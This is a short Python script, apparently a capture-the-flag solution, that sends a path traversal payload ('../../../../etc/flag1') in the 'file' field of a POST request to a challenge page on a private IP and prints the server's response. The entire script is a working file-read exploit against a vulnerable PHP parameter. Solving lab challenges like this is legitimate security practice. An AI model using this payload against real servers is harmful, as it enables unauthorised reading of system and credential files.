import requests

url = 'http://10.10.15.182/challenges/chall1.php'
data = {'file':'../../../../etc/flag1'}

response = requests.post(url, data=data)
print('\nrequest.url: ',response.url,'\n')
print('request.headers: ',response.headers,'\n')

print('***r.txt***\n', response.text)
